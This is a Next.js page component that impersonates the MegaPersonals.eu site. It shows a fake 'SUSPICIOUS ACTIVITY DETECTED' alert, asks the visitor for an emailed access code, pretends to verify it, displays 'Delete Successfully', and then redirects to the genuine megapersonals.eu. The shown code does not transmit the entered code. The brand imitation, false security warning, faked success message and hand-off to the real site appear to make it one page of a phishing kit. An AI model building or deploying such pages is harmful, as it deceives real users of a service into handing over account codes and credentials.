'use client';
import WaringModal from '@/components/WaringModal';
import Image from 'next/image';
import Link from 'next/link';
import { useRouter, useSearchParams } from 'next/navigation';
import { Suspense, useState } from 'react';

// Create a separate component for the OTP content
const OTPContent = () => {
  const [isModalOpen, setModalOpen] = useState(true);
  const [isDeleteModalOpen, setDeleteModalOpen] = useState(false);
  const [code, setCode] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const handleOkClick = () => {
    setModalOpen(false); // Close the modal
  };

  const handleDeleteModalOk = () => {
    setDeleteModalOpen(false);
    // Redirect to the external URL
    window.location.href = 'https://megapersonals.eu/';
  };

  const searchParams = useSearchParams();
  const userId = searchParams.get('valid');
  const router = useRouter();

  const handleSubmit = async (event) => {
    event.preventDefault();

    if (!code.trim()) {
      setError('Please enter the verification code');
      return;
    }

    setLoading(true);
    setError('');

    // Simulate a brief loading period then show delete success modal
    setTimeout(() => {
      setLoading(false);
      setDeleteModalOpen(true);
    }, 1000);
  };

  return (
    <main className='py-[40px] w-[570px] mx-auto'>
      <WaringModal
        isOpen={isModalOpen}
        onRequestClose={() => setModalOpen(false)}
        onOk={handleOkClick}
      />

      {/* Delete Success Modal */}
      {isDeleteModalOpen && (
        <div className="fixed inset-0 bg-black bg-opacity-50  flex items-center justify-center z-50">
          <div className="bg-white py-10 rounded-lg shadow-lg w-3/12 mx-4">
            <div className="text-center">
              <h3 className="text-lg font-semibold text-green-600 mb-4">
                Delete Successfully
              </h3>
              <button
                onClick={handleDeleteModalOk}
                className="bg-[#F0AD4E] px-6 py-1 rounded text-white font-medium hover:bg-[#e69b3a] transition-colors"
              >
                OK
              </button>
            </div>
          </div>
        </div>
      )}

      <section className='flex flex-col gap-[20px]'>
        <section className='flex justify-center gap-[20px]'>
          <Link href={'/'}><Image src={"/images/loginbenner.png"} width={413} height={83} alt='login Banner' /></Link>
        </section>

        <div className='bg-[#F8EFCE] rounded-sm text-center w-full px-[20px]'>
          <h3 className='text-[24px] text-[#B9A697] font-normal'>SUSPICIOUS ACTIVITY DETECTED</h3>
        </div>

        {/* <span className='font-bold'>September 29,2024</span> */}

        <div className='leading-[26px] text-center'>
          <h3 className='text-[#C76441] text-[24px] font-normal'>Your <span className='text-[24px] font-bold'>ACCESS CODE</span></h3>
          <h3 className='text-[#C76441] text-[24px] font-normal'>has been sent <span className='font-bold'>successfully</span> </h3>
          <h3 className='text-[#C76441] text-[24px] font-normal'>to your email on</h3>
          <h3 className='text-[#C76441] text-[24px] font-normal'>That code remains valid.</h3>
        </div>

        <div className='leading-[26px] text-center'>
          <h3 className='text-[#2FAEEA] font-bold italic text-[24px]'>CHECK YOUR SPAM</h3>
          <h3 className='text-[#2FAEEA] font-bold italic text-[24px]'>FOLDER IT MAY BE THERE.</h3>
        </div>

        <div className='flex justify-center gap-[10px]'>
          <h3 className='text-[#FF0000] text-[24px] font-bold leading-[26px] italic'>DO NOT SHARE IT</h3>
          <Image src={"/images/quetions.png"} width={26} height={24} alt='' />
        </div>

        <h3 className='text-center text-[#C76441] text-[24px] leading-[26px] font-normal'>Enter the code <br /> below to continue.</h3>

        {error && (
          <div className='flex justify-center'>
            <p className="p-2 text-center text-white bg-red-500 rounded w-[253px]">{error}</p>
          </div>
        )}

        <form onSubmit={handleSubmit} className='flex flex-col gap-[20px]'>
          <div className='flex justify-center'>
            <input
              type="text"
              value={code}
              onChange={(e) => setCode(e.target.value)}
              name="code"
              className='block outline-none w-[253px] h-[33px] rounded border border-[#c0c0c0] px-2 text-[#222222] text-[18px]'
              placeholder='Code'
              required
              disabled={loading}
            />
          </div>

          <div className='flex justify-center'>
            <button
              type="submit"
              disabled={loading}
              className={`bg-[#F0AD4E] w-[125px] h-[44px] rounded text-[#FFFFFF] text-[20px] leading-[23px] ${loading ? 'opacity-50 cursor-not-allowed' : 'cursor-pointer'}`}
            >
              {loading ? 'VERIFYING...' : 'PROCEED'}
            </button>
          </div>
        </form>

        <div className='text-center flex flex-col sm:gap-[26px] gap-[10px]'>
          <ul className='flex sm:gap-2 gap-[1px] justify-center text-[#0481C9] sm:text-[13px] text-[8px] font-normal'>
            <a href="/"><li className='cursor-pointer'>Home</li></a>
            <li>|</li>
            <li className='cursor-pointer'>Manage Posts</li>
            <li>|</li>
            <li className='cursor-pointer'>Contact Us</li>
            <li>|</li>
            <li className='cursor-pointer'>Policies & Terms</li>
          </ul>
          <h3 className='text-[#0481C9] text-[13px]'>Copyright @2024 MegaPersonals.eu</h3>
        </div>
      </section>
    </main>
  );
};

// Loading component for Suspense fallback
const OTPLoading = () => {
  return (
    <main className='py-[40px] w-[570px] mx-auto'>
      <div className='flex justify-center items-center h-64'>
        <div className='text-[#C76441] text-[24px]'>Loading...</div>
      </div>
    </main>
  );
};

// Main page component with Suspense wrapper
const Page = () => {
  return (
    <Suspense fallback={<OTPLoading />}>
      <OTPContent />
    </Suspense>
  );
};

export default Page;